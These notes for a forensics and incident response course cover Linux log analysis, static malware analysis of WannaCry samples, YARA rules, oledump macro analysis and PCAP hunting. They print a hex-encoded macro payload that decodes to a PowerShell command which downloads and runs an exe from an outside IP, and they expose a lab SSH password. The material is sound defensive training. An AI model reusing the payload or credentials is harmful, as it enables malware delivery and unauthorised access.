@@ -1,0 +1,1697 @@
+
+                               #############################
+############################## # Day 1: Linux Fundamentals # ##############################
+                               #############################
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#####################################################
+# 2020 Digital Forensics & Incident Response        #
+# By Joe McCray                                     #
+#####################################################
+ 
+- Here is a good set of slides for getting started with Linux:
+http://www.slideshare.net/olafusimichael/linux-training-24086319
+ 
+ 
+- Here is a good tutorial that you should complete before doing the labs below:
+http://linuxsurvival.com/linux-tutorial-introduction/
+ 
+ 
+- I prefer to use Putty to SSH into my Linux host.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+Here is the information to put into putty
+ 
+Host Name:          149.28.201.171
+protocol:           ssh
+port:               22
+username:           chfi
+password:           chfi!chfi123!
+ 
+ 
+If you are on a Mac (https://osxdaily.com/2017/04/28/howto-ssh-client-mac/)
+ 
+Open a terminal, then type:
+-------------------------------
+ssh -l chfi 149.28.201.171
+------------------------------
+ 
+ 
+ 
+ 
+########################
+# Basic Linux Commands #
+########################
+ 
+---------------------------Type This-----------------------------------
+cd ~
+ 
+pwd
+ 
+whereis pwd
+ 
+which pwd
+ 
+sudo find / -name pwd
+ 
+/bin/pwd
+ 
+cd ~/students/
+ 
+mkdir yourname                  <---- replace 'yourname' with your first name in lowercase with no spaces or special characters please
+ 
+cd yourname                     <---- replace 'yourname' with your first name in lowercase with no spaces or special characters please
+ 
+touch one two three
+ 
+ls -l t                         (without pressing the Enter key, press the Tab key twice. What happens?)
+ 
+h                               (and again without pressing the Enter key, press the Tab key twice. What happens?)
+ 
+Press the 'Up arrow key'        (What happens?)
+ 
+Press 'Ctrl-A'                  (What happens?)
+ 
+ls
+ 
+clear                           (What happens?)
+ 
+echo one > one
+ 
+cat one                         (What happens?)
+ 
+man cat                         (What happens?)
+    q
+ 
+cat two
+ 
+cat one > two
+ 
+cat two
+ 
+cat one two > three
+ 
+cat three
+ 
+echo four >> three
+ 
+cat three                       (What happens?)
+ 
+wc -l three
+ 
+man wc
+    q
+ 
+info wc
+    q
+ 
+cat three | grep four
+ 
+cat three | grep one
+ 
+man grep
+    q
+ 
+ 
+man ps
+    q
+ 
+ps
+ 
+ps aux
+ 
+ps aux | less
+ 
+Press the 'Up arrow key'        (What happens?)
+ 
+Press the 'Down arrow key'      (What happens?)
+    q
+ 
+top
+    q
+-----------------------------------------------------------------------
+ 
+ 
+#########
+# Files #
+#########
+---------------------------Type This-----------------------------------
+cd ~
+ 
+pwd
+ 
+cd ~/students/yourname/
+ 
+pwd
+ 
+ls
+ 
+mkdir LinuxBasics
+ 
+cd LinuxBasics
+ 
+pwd
+ 
+ls
+ 
+mkdir files
+ 
+touch one two three
+ 
+cp one files/
+ 
+ls files/
+ 
+cd files/
+ 
+cp ../two .
+ 
+ls
+ 
+cp ../three .
+ 
+ls
+ 
+tar cvf files.tar *
+ 
+ls
+ 
+gzip files.tar
+ 
+ls
+ 
+rm -rf one two three
+ 
+ls
+ 
+tar -zxvf files.tar.gz
+ 
+rm -rf files.tar.gz
+ 
+zip data *
+ 
+unzip -l data.zip
+ 
+mkdir /tmp/yourname/
+ 
+unzip data.zip -d /tmp/yourname/
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##############################################
+# Log Analysis with Linux command-line tools #
+##############################################
+- The following command line executables are found in the Mac as well as most Linux Distributions.
+ 
+cat –  prints the content of a file in the terminal window
+grep – searches and filters based on patterns
+awk –  can sort each row into fields and display only what is needed
+sed –  performs find and replace functions
+sort – arranges output in an order
+uniq – compares adjacent lines and can report, filter or provide a count of duplicates
+ 
+ 
+ 
+ 
+ 
+##############
+# Cisco Logs #
+##############
+---------------------------Type This-----------------------------------
+cd ~/students/yourname/
+mkdir security
+cd security
+mkdir log_analysis
+cd log_analysis
+wget http://45.63.104.73/cisco.log
+-----------------------------------------------------------------------
+ 
+ 
+AWK Basics
+----------
+- To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.
+---------------------------Type This-----------------------------------
+cat cisco.log | awk '{print $5}' | tail -n 4
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in “$5”, group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through “sort“, using “uniq -c” to count the like entries, then using “sort -rn” to sort it in reverse order.
+---------------------------Type This-----------------------------------
+cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- While that’s sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren’t conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain “facility-level-mnemonic”.
+---------------------------Type This-----------------------------------
+cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.
+---------------------------Type This-----------------------------------
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+                               ###########################
+############################## # Day 1: Malware Analysis # ##############################
+                               ###########################
+ 
+ 
+ 
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts). The fastest thing you can do is perform static analysis.
+ 
+ 
+ 
+####################
+# Malware Analysis #
+####################
+ 
+ 
+ 
+- After logging please open a terminal window and type the following commands:
+---------------------------Type This-----------------------------------
+cd ~/students/yourname/security/
+mkdir malware_analysis
+cd malware_analysis
+-----------------------------------------------------------------------
+ 
+- This is actual Malware (remember to run it in a VM - the password to extract it is 'infected':
+ 
+---------------------------Type This-----------------------------------
+wget https://infosecaddicts-files.s3.amazonaws.com/malware-password-is-infected.zip --no-check-certificate
+wget https://infosecaddicts-files.s3.amazonaws.com/analyse_malware.py --no-check-certificate
+wget https://infosecaddicts-files.s3.amazonaws.com/wannacry.zip --no-check-certificate
+ 
+unzip malware-password-is-infected.zip
+    infected
+ 
+file malware.exe
+ 
+mv malware.exe malware.pdf
+ 
+file malware.pdf
+ 
+mv malware.pdf malware.exe
+ 
+hexdump -n 2 -C malware.exe
+-----------------------------------------------------------------------
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+Reference:
+http://www.garykessler.net/library/file_sigs.html
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+objdump -x malware.exe
+ 
+strings malware.exe
+ 
+strings --all malware.exe | head -n 6
+ 
+strings malware.exe | grep -i dll
+ 
+strings malware.exe | grep -i library
+ 
+strings malware.exe | grep -i reg
+ 
+strings malware.exe | grep -i hkey
+ 
+strings malware.exe | grep -i hku
+-----------------------------------------------------------------------
+                            - We didn't see anything like HKLM, HKCU or other registry type stuff
+ 
+ 
+---------------------------Type This-----------------------------------
+strings malware.exe | grep -i irc
+ 
+strings malware.exe | grep -i join        
+ 
+strings malware.exe | grep -i admin
+ 
+strings malware.exe | grep -i list
+-----------------------------------------------------------------------
+ 
+                            - List of IRC commands: https://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands
+ 
+---------------------------Type This-----------------------------------
+nano analyse_malware.py
+ 
+python2 analyse_malware.py malware.exe
+-----------------------------------------------------------------------
+ 
+ 
+ 
+  
+ 
+---------------------------Type This----------------------------------- 
+cd ~/students/yourname/security/malware_analysis 
+
+unzip wannacry.zip
+    infected
+
+objdump -x wannacry.exe
+ 
+objdump -x wannacry.exe | less
+     q
+ 
+strings wannacry.exe
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+----------------------------------------------------------------------
+ 
+
+
+
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://www.mcafee.com/blogs/other-blogs/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings in our file
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/students/yourname/security/malware_analysis 
+
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+################################
+# Good references for WannaCry #
+################################
+ 
+References:
+ 
+https://gist.github.com/rain-1/989428fa5504f378b993ee6efbc0b168
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+https://infosecaddicts-files.s3.amazonaws.com/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+nano am.py
+ 
+python am.py wannacry.exe
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+##############
+# Yara Ninja #
+##############
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://www.mcafee.com/blogs/other-blogs/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+ 
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+---------------------------Type This-----------------------------------
+cd ~/students/yourname/security/malware_analysis  
+ 
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+ 
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+Let's see if we can get yara working.
+---------------------------Type This-----------------------------------
+cd ~/students/yourname/security/malware_analysis
+ 
+mkdir quick_yara
+ 
+cd quick_yara
+wget http://45.63.104.73/wannacry.zip
+ 
+unzip wannacry.zip
+     **** password is infected ***
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+nano wannacry_1.yar
+ 
+---------------------------Paste This-----------------------------------
+rule wannacry_1 : ransom
+{
+   meta:
+       author = "Joshua Cannell"
+       description = "WannaCry Ransomware strings"
+       weight = 100
+       date = "2017-05-12"
+ 
+   strings:
+       $s1 = "Ooops, your files have been encrypted!" wide ascii nocase
+       $s2 = "Wanna Decryptor" wide ascii nocase
+       $s3 = ".wcry" wide ascii nocase
+       $s4 = "WANNACRY" wide ascii nocase
+       $s5 = "WANACRY!" wide ascii nocase
+       $s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
+ 
+   condition:
+       any of them
+}
+ 
+----------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+yara wannacry_1.yar wannacry.exe
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+nano wannacry_2.yar
+ 
+---------------------------Paste This-----------------------------------
+rule wannacry_2{
+   meta:
+       author = "Harold Ogden"
+       description = "WannaCry Ransomware Strings"
+       date = "2017-05-12"
+       weight = 100
+ 
+   strings:
+       $string1 = "msg/m_bulgarian.wnry"
+       $string2 = "msg/m_chinese (simplified).wnry"
+       $string3 = "msg/m_chinese (traditional).wnry"
+       $string4 = "msg/m_croatian.wnry"
+       $string5 = "msg/m_czech.wnry"
+       $string6 = "msg/m_danish.wnry"
+       $string7 = "msg/m_dutch.wnry"
+       $string8 = "msg/m_english.wnry"
+       $string9 = "msg/m_filipino.wnry"
+       $string10 = "msg/m_finnish.wnry"
+       $string11 = "msg/m_french.wnry"
+       $string12 = "msg/m_german.wnry"
+       $string13 = "msg/m_greek.wnry"
+       $string14 = "msg/m_indonesian.wnry"
+       $string15 = "msg/m_italian.wnry"
+       $string16 = "msg/m_japanese.wnry"
+       $string17 = "msg/m_korean.wnry"
+       $string18 = "msg/m_latvian.wnry"
+       $string19 = "msg/m_norwegian.wnry"
+       $string20 = "msg/m_polish.wnry"
+       $string21 = "msg/m_portuguese.wnry"
+       $string22 = "msg/m_romanian.wnry"
+       $string23 = "msg/m_russian.wnry"
+       $string24 = "msg/m_slovak.wnry"
+       $string25 = "msg/m_spanish.wnry"
+       $string26 = "msg/m_swedish.wnry"
+       $string27 = "msg/m_turkish.wnry"
+       $string28 = "msg/m_vietnamese.wnry"
+ 
+ 
+   condition:
+       any of ($string*)
+}
+----------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+yara wannacry_2.yar wannacry.exe
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/students/yourname/security/malware_analysis/quick_yara
+ 
+git clone https://github.com/Yara-Rules/rules.git
+ 
+cd rules/
+ 
+cd malware/
+
+rm -rf RAT_PoetRATPython.yar
+
+cd ..
+
+./index_gen.sh
+ 
+ls
+ 
+cd malware/
+ 
+ls | grep -i ransom
+ 
+ls | grep -i rat
+ 
+ls | grep -i toolkit
+ 
+ls | grep -i apt
+ 
+cd ..
+ 
+cd capabilities/
+ 
+ls
+ 
+cat capabilities.yar
+ 
+cd ..
+ 
+cd cve_rules/
+ 
+ls
+ 
+cd ..
+ 
+./index_gen.sh
+ 
+cd ..
+ 
+yara -w rules/index.yar wannacry.exe
+ 
+ 
+----------------------------------------------------------------------
+ 
+ 
+References:
+https://www.slideshare.net/JohnLaycock1/yet-another-yara-allocution-yaya
+https://www.slideshare.net/KasperskyLabGlobal/upping-the-apt-hunting-game-learn-the-best-yara-practices-from-kaspersky
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+#####################################################
+---------------------------Type This-----------------------------------
+cd ~/students/yourname/security/malware_analysis
+ 
+mkdir macro_docs
+ 
+cd macro_docs
+ 
+wget https://infosecaddicts-files.s3.amazonaws.com/064016.zip
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+ 
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A3 -v
+ 
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+#########################################
+# Security Operations Center Job Roles  #
+# Intrusion Analysis Level 1            #
+#########################################
+Required Technical Skills:      Comfortable with basic Linux/Windows (MCSA/Linux+)
+                                Comfortable with basic network (Network+)
+                                Comfortable with security fundamentals (Security+)
+       
+ 
+ 
+ 
+ 
+Job Task:                       Process security events, follow incident response triage playbook
+ 
+#########################################
+# Security Operations Center Job Roles  #
+# Intrusion Analysis Level 2            #
+#########################################
+ 
+Required Technical Skills:      Comfortable with basic Linux/Windows system administration
+                                Comfortable with basic network administration
+                                Comfortable with basic programming
+                                Comfortable researching IT security issues
+       
+ 
+ 
+ 
+ 
+Job Task:                       Perform detailed malware analysis, assist with development of the incident response triage playbook
+ 
+Sample Playbook:                https://infosecaddicts-files.s3.amazonaws.com/IR-Program-and-Playbooks.zip
+ 
+ 
+ 
+#########################################
+# Security Operations Center Job Roles  #
+# Intrusion Analysis Level 3            #
+#########################################
+ 
+Required Technical Skills:      Strong statistical analysis background
+                                Strong programming background (C, C++, Java, Assembly, scripting languages)
+                                Advanced system/network administration background
+                                Comfortable researching IT security issues
+       
+ 
+ 
+ 
+ 
+Job Task:                       Perform detailed malware analysis
+                                Perform detailed statistical analysis
+                                Assist with development of the incident response triage playbook
+ 
+ 
+ 
+ 
+#################################################
+# Good references for learning Malware Analysis #
+#################################################
+ 
+References:
+https://www.slideshare.net/SamBowne/cnit-126-ch-0-malware-analysis-primer-1-basic-static-techniques
+https://www.slideshare.net/grecsl/malware-analysis-101-n00b-to-ninja-in-60-minutes-at-bsideslv-on-august-5-2014
+https://www.slideshare.net/Bletchley131/intro-to-static-analysis
+
+
+
+
+
+                               #####################################
+############################## # Day 2: Threat Hunting on the wire # ##############################
+                               #####################################
+ 
+ 
+ 
+ 
+- After logging please open a terminal window and type the following commands:
+---------------------------Type This-----------------------------------
+cd ~/students/yourname/security/
+mkdir pcap_analysis
+cd pcap_analysis
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##################################################################
+# Analyzing a PCAP Prads                                         #
+# Note: run as regular user                                      #
+##################################################################
+ 
+---------------------------Type this as a regular user----------------------------------
+cd ~/students/yourname/security/pcap_analysis/
+ 
+mkdir prads
+ 
+cd prads
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+prads -r suspicious-time.pcap -l prads-asset.log
+ 
+cat prads-asset.log | less
+ 
+cat prads-asset.log | grep SYN | grep -iE 'windows|linux'
+ 
+cat prads-asset.log | grep CLIENT | grep -iE 'safari|firefox|opera|chrome'
+ 
+cat prads-asset.log | grep SERVER | grep -iE 'apache|linux|ubuntu|nginx|iis'
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##################################
+# PCAP Analysis with ChaosReader #
+# Note: run as regular user      #
+##################################
+---------------------------Type this as a regular user----------------------------------
+cd ~/students/yourname/security/pcap_analysis/
+ 
+mkdir chaos_reader/
+ 
+cd chaos_reader/
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+wget http://45.63.104.73/chaosreader.pl
+ 
+perl chaosreader.pl suspicious-time.pcap
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+ 
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u | awk '{print $5}' > url.lst
+ 
+ 
+wget https://raw.githubusercontent.com/Open-Sec/forensics-scripts/master/check-urls-virustotal.py
+ 
+ 
+python check-urls-virustotal.py url.lst
+ 
+ 
+ 
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#############################
+# PCAP Analysis with tshark #
+# Note: run as regular user #
+#############################
+---------------------------Type this as a regular user---------------------------------
+cd ~/students/yourname/security/pcap_analysis/
+ 
+mkdir tshark
+ 
+cd tshark/
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+tshark -i ens3 -r suspicious-time.pcap -qz io,phs
+ 
+tshark -r suspicious-time.pcap -qz ip_hosts,tree
+ 
+tshark -r suspicious-time.pcap -Y "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
+ 
+tshark -r suspicious-time.pcap -Y "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
+ 
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}'
+ 
+whois rapidshare.com.eyu32.ru
+ 
+whois sploitme.com.cn
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
+ 
+tshark -r suspicious-time.pcap -qz http_req,tree
+ 
+tshark -r suspicious-time.pcap -Y "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+###############################
+# Extracting files from PCAPs #
+# Note: run as regular user   #
+###############################
+---------------------------Type this as a regular user---------------------------------
+cd ~/students/yourname/security/pcap_analysis/
+ 
+mkdir extract_files
+ 
+cd extract_files
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+foremost -v -i suspicious-time.pcap
+ 
+cd output
+ 
+ls
+ 
+cat audit.txt
+ 
+cd exe
+ 
+wget https://raw.githubusercontent.com/GREEKYnikhilsharma/Xen0ph0n-VirusTotal_API_Tool-Python3/master/vtlite.py
+---------------------------------------------------------------------------------------
+ 
+ 
+******* NOTE: You will need to put your virustotal API key in vtlite.py *******
+* Create an account in virustotal > login > click on your profile > API key > copy API key > in terminal do nano vtlite.py >
+* Paste the API key in where it says > profit
+********************************************************************************
+ 
+---------------------------Type this as a regular user---------------------------------
+for f in *.exe; do python3 vtlite.py -s $f; sleep 20; done
+---------------------------------------------------------------------------------------
+ 
+ 
+###############################
+# PCAP Analysis with Suricata #
+# Note: run as root           #
+###############################
+--------------------------Type this as root--------------------------------
+cd ~/students/yourname/security/pcap_analysis/
+ 
+mkdir suricata
+ 
+cd suricata/
+ 
+wget http://45.63.104.73/suspicious-time.pcap
+ 
+mkdir suri
+ 
+sudo suricata -c /etc/suricata/suricata.yaml -r suspicious-time.pcap -l suri/
+ 
+cd suri/
+ 
+cat stats.log | less
+ 
+cat eve.json |grep -E "e\":\"http"|jq ".timestamp,.http"|csplit - /..T..:/ {*}
+ 
+cat xx01
+ 
+cat xx02
+ 
+cat xx03
+ 
+cat xx04
+ 
+cat xx05
+ 
+cat xx06
+------------------------------------------------------------------------
+ 
+ 
+#############################
+# PCAP Analysis with Yara   #
+# Note: run as regular user #
+#############################
+-------------------------Type this as a regular user----------------------------------
+cd ~/students/yourname/security/pcap_analysis/
+ 
+git clone https://github.com/kevthehermit/YaraPcap.git
+
+cd YaraPcap/
+
+wget http://45.63.104.73/suspicious-time.pcap
+
+wget https://github.com/Yara-Rules/rules/archive/master.zip
+
+
+unzip master.zip
+
+cd rules-master/
+
+cd malware/
+
+rm -rf RAT_PoetRATPython.yar
+
+cd ..
+
+ls
+
+cat index.yar
+
+clear
+
+./index_gen.sh
+
+cd ..
+
+mkdir matching_files/
+
+python yaraPcap.py rules-master/index.yar suspicious-time.pcap -s matching_files/
+
+whereis tcpflow
+
+vi yaraPcap.py        **** fix line 35 with correct path to tcpflow (/usr/bin/tcpflow)****
+
+python yaraPcap.py rules-master/index.yar suspicious-time.pcap -s matching_files/
+
+cd matching_files/
+
+ls
+
+cat report.txt
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+#################################################################################
+# Now that you know packet analysis here are the next set of files to play with #
+#################################################################################
+wget https://github.com/SpiderLabs/IOCs-IDPS/raw/master/APT41/APT41_StoreSyncSvc.pcap
+wget https://github.com/SpiderLabs/IOCs-IDPS/raw/master/Agent_Tesla/agenttesla_09July2019.pcap
+wget https://github.com/SpiderLabs/IOCs-IDPS/raw/master/CVE-2019-9978/CVE-2019-9978_attempt_05May2019.pcap
+wget https://github.com/SpiderLabs/IOCs-IDPS/raw/master/Powershell/Powershell_script_19Dec2019.pcap
+wget https://github.com/SpiderLabs/IOCs-IDPS/raw/master/sharik_smoke/sharik_smoke.pcap
+wget https://github.com/SpiderLabs/IOCs-IDPS/raw/master/Microsoft/CVE-2019-0703.pcap
+wget https://github.com/SpiderLabs/IOCs-IDPS/raw/master/Microsoft/CVE-2019-0801.pcap
+ 
+ 
+ 
+References:
+https://www.slideshare.net/j0b1n/tcpdump-hunter
+https://www.slideshare.net/AviNetworks/reconsider-tcpdump-for-modern-troubleshooting
+
+
+
+I often get asked how I did it. How did I learn Python without having been a computer science major, without having gone to college, and for that matter not actually learning to program until I had been in the field for 8 years. Here is what I did.
+ 
+ 
+Step 1: Watch and do the newboston Python video series twice
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA
+ 
+ 
+Step 2:  Watch and do the Google Python workshop twice
+https://www.youtube.com/playlist?list=PLfZeRfzhgQzTMgwFVezQbnpc1ck0I6CQl
+ 
+ 
+Step 3: Download all of the Python tools from PacketStorm and analyze the source code
+https://packetstormsecurity.com/files/tags/python
+ 
+ 
+Here is the code from Packet Storm
+https://infosecaddicts-files.s3.amazonaws.com/PythonReferenceCode.zip
+ 
+I went through almost every single file and looked up the code that I didn't understand.
+I also asked programmers to help me understand the lines of code that didn't make sense.
+In the folder  RAC-Brute I actually had to hire a developer from an outsourcing website to comment,
+and explain the tool to me.
+ 
+Here is what I got out of doing that:
+https://infosecaddicts-files.s3.amazonaws.com/Python/sorted-commented-python-files.zip
+ 
+ 
+ 
+Distilled that into this:
+https://infosecaddicts-files.s3.amazonaws.com/Python-Courseware.zip
+ 
+ 
+ 
+ 
+                            ##############################
+----------- ############### # Day 3: Python Fundamentals # ############### -----------
+                            ##############################
+ 
+ 
+#####################
+# Installing Python #
+#####################
+Windows
+ 
+https://www.python.org/downloads/
+ 
+32-Bit Version
+https://www.python.org/ftp/python/3.7.3/python-3.7.3-webinstall.exe
+ 
+64-Bit Version
+https://www.python.org/ftp/python/3.7.3/python-3.7.3-amd64-webinstall.exe
+ 
+ 
+After you install Python in Windows the next thing you may want to install is IdleX:
+http://idlex.sourceforge.net/features.html
+ 
+---------------------------Type This-----------------------------------
+ 
+Linux
+Debian/Ubuntu:      sudo apt-get install -y python
+RHEL/CentOS/Fedora: sudo yum install -y python
+ 
+-----------------------------------------------------------------------
+ 
+ 
+After you install Python in Linux the next thing that you will need to do is install idle.
+ 
